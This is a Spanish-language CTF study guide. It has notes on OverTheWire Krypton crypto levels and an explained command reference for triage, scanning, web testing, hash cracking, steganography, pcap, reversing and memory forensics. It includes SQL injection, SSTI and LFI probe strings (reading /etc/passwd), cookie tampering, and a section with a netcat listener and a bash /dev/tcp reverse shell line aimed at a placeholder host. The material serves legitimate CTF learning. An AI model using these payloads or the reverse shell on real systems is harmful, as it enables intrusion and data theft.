  • Concepto: la pass viene codificada en Base64 (texto A–Z a–z 0–9 + /, suele acabar en =). Codificación, no cifrado.
  • Técnica/Comando: echo "S1JZUFRPTklTR1JFQVQ=" | base64 -d → da la pass en MAYÚSCULAS.
  • Lección: reconocer y decodificar Base64 al instante; es la primera capa típica en CTF.

Krypton 1 → 2 — César / ROT13 (clave conocida)#

  • Concepto: cifrado César (desplaza cada letra N posiciones). ROT13 = desplazamiento 13; como 13 es la mitad de 26, es su propia inversa (cifrar y descifrar es la misma operación).
  • Técnica/Comando: cat krypton2 | tr 'A-Za-z' 'N-ZA-Mn-za-m'
    • Ej.: YRIRY GJB CNFFJBEQ EBGGRA → LEVEL TWO PASSWORD ROTTEN (pass = ROTTEN).
  • Lección: ROT13/César es ofuscación, no seguridad: solo 25 desplazamientos, se rompe a mano.

Krypton 2 → 3 — César con clave desconocida (oráculo de cifrado)#

  • Concepto: César pero no sabes el desplazamiento. La clave: hay un binario encrypt que cifra lo que le des (clave en keyfile.dat, que no puedes leer).
  • Técnica (chosen-plaintext / oráculo): cifras un texto que tú eliges (el alfabeto completo) y observas la salida → obtienes la tabla de sustitución entera sin leer la clave. Luego inviertes sobre el archivo de la pass.
  • Comando:

``bash mkdir /tmp/mio; cd /tmp/mio ln -s /krypton/krypton2/keyfile.dat # encrypt lo busca en el CWD echo "ABCDEFGHIJKLMNOPQRSTUVWXYZ" > plano.txt /krypton/krypton2/encrypt plano.txt # genera ciphertext.out cat ciphertext.out # tu tabla: p.ej. A->N (resultó ROT13) cat /krypton/krypton2/krypton3 | tr 'CIFRADO' 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' # invertir ` (Si la tabla sale NOPQ..., es ROT13: descifras con el mismo tr 'A-Za-z' 'N-ZA-Mn-za-m'`.)

  • Lección: tener acceso a la función de cifrado rompe los cifrados débiles. La cripto moderna se diseña para resistir incluso chosen-plaintext.

Patrones y lecciones (resumen)#

  • No confíes en el cliente: fuente HTML, Referer, User-Agent, cookies y parámetros los controla el usuario → se falsean. Autoriza en el servidor.
  • Ocultar ≠ proteger: comentarios, robots.txt, directory listing, archivos "incluidos" accesibles... todo filtra.
  • Codificar ≠ cifrar: Base64, hex, invertir, ROT13 no tienen clave → reversibles por cualquiera.
  • Input sin validar = inyección: en rutas/include → LFI; en comandos de shell → command injection/RCE. Blacklists fallan; usa whitelist o evita la shell.
  • Cripto débil cae con texto conocido/elegido: XOR con clave reutilizada (known-plaintext) y César con oráculo (chosen-plaintext).
  • Reconocer formatos: = final → Base64; texto en MAYÚSCULAS desplazado → César/ROT.

Guía explicada — por qué, cuándo, cómo e interpretar#

Complemento de estudio de COMANDOS.md. Aquí cada comando trae: Por qué sirve · Cuándo usarlo · Cómo · Ejemplo chico · Interpretar (qué significa lo que ves). Convención: MAYÚSCULAS = lo cambias tú. Formato de bandera del evento: flag{...} o CyberFEI{...}.

A. Triage — lo primero con cualquier archivo#

file ARCHIVO#

  • Por qué: lee los primeros bytes (magic bytes) y dice el tipo real, ignorando la extensión. En CTF las extensiones mienten a propósito.
  • Cuándo: nada más recibir un archivo, siempre el primero.
  • Cómo: file sospechoso
  • Ejemplo: file reto.jpg
  • Interpretar:
    • JPEG image data → es lo que dice, sigue con estego.
    • Zip archive data aunque se llame .jpg → le cambiaron la extensión; renómbralo a .zip.
    • data → tipo desconocido o header corrupto/borrado: mira xxd y arregla los magic bytes.
    • ELF 64-bit executable → binario Linux, vas a reversing.

strings -n 6 ARCHIVO#

  • Por qué: extrae el texto legible escondido entre los bytes. Muchísimas flags están en claro.
  • Cuándo: con cualquier archivo binario, imagen, dump o ejecutable.
  • Cómo: strings -n 6 ARCHIVO ( -n 6 = mínimo 6 caracteres, quita ruido).
  • Ejemplo: strings -n 6 reto.bin | grep -iE 'flag|cyberfei'
  • Interpretar:
    • Sale CyberFEI{...} → terminaste, era texto plano.
    • Ves rutas (/home/user/...), nombres de función, mensajes ("Wrong password") → pistas de cómo funciona el programa.
    • No sale nada útil → quizá esté comprimido/cifrado dentro: prueba binwalk.

exiftool ARCHIVO#

  • Por qué: muestra metadatos: autor, fecha, GPS, software, y el campo Comment (donde suelen meter la flag).
  • Cuándo: imágenes, PDFs, audio, documentos.
  • Cómo: exiftool foto.jpg
  • Ejemplo: exiftool -a -G1 foto.jpg ( -a todo, -G1 agrupado por origen).
  • Interpretar:
    • Campo Comment: ZmxhZ3t... → decodifícalo (parece base64).
    • GPS Position: 19.4 N, 99.1 W → el reto pregunta un lugar; busca esas coordenadas.
    • Software: Adobe... o fechas raras → posible pista narrativa del reto.

binwalk ARCHIVO / binwalk -e ARCHIVO#

  • Por qué: detecta y extrae archivos escondidos dentro de otro (un ZIP dentro de un PNG, etc.).
  • Cuándo: cuando file/strings no bastan y sospechas algo incrustado.
  • Cómo: binwalk reto.png para ver; binwalk -e reto.png para extraer.
  • Ejemplo: binwalk -e captura.png
  • Interpretar:
    • Lista con Zip archive, PNG image, gzip compressed en distintos offsets → hay varios archivos pegados; -e los saca a _reto.png.extracted/.
    • Solo una línea con el tipo esperado → no hay nada incrustado, prueba zsteg/steghide.

xxd ARCHIVO | head#

  • Por qué: volcado hex + ASCII; te deja ver y comparar los magic bytes del inicio.
  • Cuándo: cuando file dice data o un archivo "no abre".
  • Cómo: xxd ARCHIVO | head
  • Ejemplo: xxd reto.png | head -1
  • Interpretar: compara el inicio con la firma correcta:
    • PNG debe empezar 89 50 4E 47. Si ves 00 00 00 00, le borraron el header → arréglalo con un editor hex.
    • 50 4B 03 04 (PK) = ZIP. FF D8 FF = JPG. 25 50 44 46 (%PDF) = PDF.

B. Red y servicios#

nmap -sC -sV -p- OBJETIVO#

  • Por qué: descubre qué puertos/servicios están vivos y su versión → por ahí atacas.
  • Cuándo: el reto te da una IP o host.
  • Cómo: -p- todos los puertos, -sV versión, -sC scripts básicos.
  • Ejemplo: nmap -sC -sV -p- 10.10.10.5 -oN nmap.txt
  • Interpretar:
    • 80/tcp open http Apache 2.4.49 → hay web; apunta searchsploit apache 2.4.49.
    • open = accesible · closed = puerto responde pero sin servicio · filtered = firewall lo bloquea (prueba -Pn).
    • El número de puerto te dice el camino: 21=FTP, 22=SSH, 80/443=web, 3306=MySQL, 445=SMB.

nc OBJETIVO PUERTO#

  • Por qué: te conecta "a pelo" a un servicio para hablar con él.
  • Cuándo: retos que te dan host puerto (misc, pwn jr, banner grabbing).
  • Cómo: nc 10.10.10.5 1337
  • Ejemplo: nc 10.10.10.5 1337
  • Interpretar:
    • Te sale un menú o pregunta → responde según pida (a veces es resolver operaciones rápido).
    • Un banner 220 ProFTPD 1.3.5 → versión del servicio → searchsploit.
    • Silencio total → quizá espera que TÚ mandes algo primero.

C. Web#

curl -I http://OBJETIVO#

  • Por qué: muestra solo las cabeceras de respuesta sin descargar la página.
  • Cuándo: reconocimiento web rápido; ver servidor, cookies, redirecciones.
  • Cómo: -I solo headers; -i headers + cuerpo.
  • Ejemplo: curl -I http://OBJETIVO
  • Interpretar:
    • HTTP/1.1 200 OK → existe y carga. 301/302 → redirige (mira Location:). 403 → prohibido (existe pero sin acceso). 401 → pide login. 500 → error del servidor (a veces explotable).
    • Set-Cookie: role=user → cookie manipulable (cámbiala a admin).
    • Server: nginx/1.18 / X-Powered-By: PHP/7.4 → tecnología → exploits.

curl con opciones (POST, cookie, proxy)#

  • Por qué: manda peticiones a medida sin navegador (a veces el navegador oculta cosas).
  • Cuándo: probar logins, enviar parámetros, pasar por Burp.
  • Cómo:
    • curl -X POST -d "u=admin&p=1234" http://OBJETIVO/login (envía formulario)
    • curl -b "admin=1" http://OBJETIVO/panel (manda cookie)
    • curl -x http://127.0.0.1:8080 http://OBJETIVO (lo pasa por Burp)
  • Ejemplo: curl -s http://OBJETIVO/ | grep -i flag
  • Interpretar: compara el cuerpo según cambias la petición. Si al mandar admin=1 aparece contenido nuevo → la cookie controlaba el acceso.

feroxbuster -u http://OBJETIVO ("ferro")#

  • Por qué: descubre rutas/archivos ocultos probando una wordlist, y baja recursivamente en lo que encuentra.
  • Cuándo: toda web; buscas /admin, /backup, /flag.txt.
  • Cómo: feroxbuster -u http://OBJETIVO -x php,txt,bak -d 2 -C 404,403
  • Ejemplo: feroxbuster -u http://OBJETIVO -o ferox.txt
  • Interpretar la columna de estado:
    • 200 → existe y accesible (¡míralo!).
    • 301/302 → redirección (suele ser una carpeta; ferox entra solo).
    • 403 → existe pero prohibido (interesante: hay algo que esconden).
    • 401 → pide autenticación.
    • El tamaño (bytes) igual en muchas respuestas = el "404 bonito"; fíltralo con -C o por tamaño.

Inyección SQL — detectar a mano#

  • Por qué: si un input va sin sanear a la consulta SQL, puedes leer la BD.
  • Cuándo: logins, buscadores, ?id=1.
  • Cómo: mete comillas y lógica: ' OR '1'='1, admin'--, ' ORDER BY 3--.
  • Ejemplo: en el usuario pon admin'-- y cualquier contraseña.
  • Interpretar:
    • Entras sin contraseña válida → inyección confirmada.
    • ORDER BY 3 funciona pero ORDER BY 4 da error → hay 3 columnas (úsalas en el UNION SELECT 1,2,3--).
    • Error de SQL en pantalla → vulnerable y encima te filtra el motor (MySQL, etc.).

SSTI — {{7*7}}#

  • Por qué: si la plantilla evalúa tu entrada, puedes llegar a ejecutar código.
  • Cuándo: campos que reflejan tu texto (nombre, saludo).
  • Cómo: manda {{7*7}} (o ${7*7}, #{7*7}).
  • Interpretar: si responde 49 → inyectable (lo evaluó). Si responde literal {{7*7}} → no lo es.

LFI — ?file=../../../../etc/passwd#

  • Por qué: subir por el árbol de carpetas deja leer archivos del sistema.
  • Cuándo: parámetros tipo ?page=, ?file=.
  • Interpretar:
    • Ves root:x:0:0: → es /etc/passwd: LFI confirmada.
    • Con php://filter/convert.base64-encode/resource=index.php te sale base64 → decodifícalo para leer el código PHP (ahí suele estar la flag o credenciales).

D. Contraseñas y hashes#

hashid 'HASH'#

  • Por qué: identifica el tipo de hash para elegir el modo correcto al romperlo.
  • Cuándo: te dan un hash suelto o lo sacaste de una BD.
  • Ejemplo: hashid '5f4dcc3b5aa765d61d8327deb882cf99'
  • Interpretar: te lista candidatos (MD5, NTLM...). La longitud ayuda: 32 hex = MD5/NTLM, 40 = SHA1, 64 = SHA256.

hashcat -m MODO hash.txt rockyou.txt#

  • Por qué: prueba millones de contraseñas de un diccionario contra el hash (usa GPU).
  • Cuándo: ya sabes el tipo (con hashid).
  • Cómo: -m el modo (0=MD5, 100=SHA1, 1400=SHA256, 1800=sha512crypt, 3200=bcrypt, 16500=JWT), -a 0 diccionario.
  • Ejemplo: hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
  • Interpretar:
    • Status: Cracked + hash:password → esa es la contraseña.
    • Status: Exhausted → no estaba en el diccionario (prueba máscara -a 3 '?d?d?d?d' o reglas).
    • Ver la contraseña después: hashcat -m 0 hash.txt --show.

john --wordlist=rockyou.txt h.txt y zip2john#

  • Por qué: John rompe hashes y, con *2john, archivos protegidos (ZIP, PDF, RAR, SSH).
  • Cuándo: ZIP/PDF con contraseña, o hashes variados.
  • Cómo: zip2john secreto.zip > h.txt && john --wordlist=rockyou.txt h.txt
  • Ejemplo: john --show h.txt
  • Interpretar: secreto.zip:contraseña → úsala para unzip. Si no imprime nada tras terminar → no estaba en el diccionario.

E. Esteganografía#

zsteg -a img.png#

  • Por qué: revisa los bits menos significativos (LSB) de PNG/BMP, truco de estego clásico.
  • Cuándo: imagen PNG/BMP y strings/binwalk no dieron nada.
  • Ejemplo: zsteg -a reto.png
  • Interpretar: una línea tipo b1,rgb,lsb,xy .. text: "CyberFEI{...}" → ahí está. Puro ruido/basura en todas → no es LSB; prueba steghide o Stegsolve.

steghide extract -sf img.jpg / stegseek img.jpg rockyou.txt#

  • Por qué: steghide esconde datos con contraseña en JPG/BMP/WAV; stegseek la rompe por diccionario.
  • Cuándo: JPG/WAV sospechoso.
  • Ejemplo: steghide extract -sf reto.jpg (prueba Enter = sin pass, o palabras del reto).
  • Interpretar:
    • wrote extracted data to "secreto.txt" → ábrelo, ahí viene algo.
    • could not extract... con pass vacía → tiene contraseña: usa stegseek.
    • stegseek: Found passphrase: "xxx" + extrae el archivo → listo.

Audio → espectrograma#

  • Por qué: muchos mensajes se "dibujan" en el espectro de frecuencias, no se oyen.
  • Cuándo: el reto te da un audio sin razón aparente.
  • Cómo: ábrelo en Audacity → menú de la pista → Espectrograma.
  • Interpretar: si ves letras/figuras formadas en la imagen del espectro → esa es la flag.

F. Tráfico de red (.pcap)#

Wireshark: Follow TCP Stream#

  • Por qué: reconstruye una conversación completa (lo que mandó cliente y servidor) en texto legible.
  • Cuándo: casi todo pcap. Es tu reflejo #1.
  • Cómo: clic derecho en un paquete → Follow → TCP/HTTP Stream.
  • Interpretar: verás el diálogo crudo; busca USER/PASS, POST /login, o flag{. Los textos en rojo/azul separan quién habla.

tshark -r cap.pcap -Y "http.request"#

  • Por qué: Wireshark en terminal; filtra y saca campos sin abrir la GUI.
  • Cuándo: pcaps grandes, o para pegar salida en el writeup.
  • Ejemplo: tshark -r cap.pcap -Y http.request -T fields -e http.host -e http.request.uri
  • Interpretar: lista de hosts+rutas pedidas. Una URL rara o repetida (/admin, /exfil?d=...) marca el punto interesante.

tcpdump -r cap.pcap -A | grep -i flag#

  • Por qué: vuelca el payload en ASCII y lo filtras.
  • Cuándo: revisión rápida sin abrir Wireshark.
  • Interpretar: si aparece la flag, ya está. Subdominios DNS larguísimos (a1b2c3.tunnel.site) → datos exfiltrados en base32/hex: decodifícalos.

G. Reversing#

checksec --file=BINARIO#

  • Por qué: lista las protecciones del binario; definen cómo se ataca (sobre todo en pwn).
  • Cuándo: antes de meterte a explotar un ELF.
  • Interpretar:
    • NX enabled → no ejecutas shellcode en la pila; usa ROP/ret2libc.
    • No canary found → puedes desbordar sin preocuparte del canario.
    • No PIE → direcciones fijas (más fácil saltar a una función).

ltrace ./BINARIO#

  • Por qué: muestra las llamadas a librería mientras corre; revela comparaciones.
  • Cuándo: crackmes, "adivina la contraseña".
  • Ejemplo: ltrace ./reto
  • Interpretar: si ves strcmp("loquepuse", "S3cr3t") → S3cr3t es la contraseña correcta (el segundo argumento).

strings -n 6 BINARIO | grep -iE 'flag|pass|key'#

  • Por qué: muchos crackmes jr traen la flag/clave en claro.
  • Interpretar: si aparece, listo; si no, abre en Ghidra y lee main (pseudo-C).

H. Forense de memoria y disco#

vol -f dump.mem windows.info#

  • Por qué: Volatility 3 analiza volcados de RAM; info da el perfil/SO, base de todo lo demás.
  • Cuándo: te dan un .mem/.raw/.dmp.
  • Interpretar: confirma que el dump se lee y qué Windows es. A partir de ahí corres windows.pslist, windows.cmdline, etc.

vol -f dump.mem windows.pslist / windows.cmdline#

  • Por qué: lista procesos y los comandos con que arrancaron.
  • Interpretar: un proceso raro (powershell.exe con argumentos codificados, nombres extraños) o una cmdline con -enc <base64> → ahí está la actividad maliciosa / la pista.

foremost -i disco.img -o salida/#

  • Por qué: recupera archivos por su firma (file carving), incluso borrados.
  • Cuándo: imágenes de disco, "recupera el archivo borrado".
  • Interpretar: en salida/ aparecen carpetas por tipo (jpg/, pdf/); revisa los recuperados con strings/exiftool.

I. Inyección de shell#

nc -lvnp 4444 (listener en tu Kali)#

  • Por qué: abre un puerto a la escucha donde caerá la shell de la víctima.
  • Cuándo: antes de lanzar una reverse shell.
  • Interpretar:
    • Se queda esperando (sin prompt) → está escuchando, bien.
    • Aparece connect to ... from ... y luego un prompt → la shell entró. Prueba id.

bash -i >& /dev/tcp/TU_IP/4444 0>&1 (en la víctima)#

  • Por qué: abre una bash y redirige su E/S por TCP hasta tu listener.

J. Buscar la flag en todo (comodín final)#

grep -raoiE '[A-Za-z0-9_]+\{[^}]+\}' .#

  • Interpretar: cada línea es archivo: coincidencia. Si sale CyberFEI{...}, el nombre del archivo te dice dónde estaba.
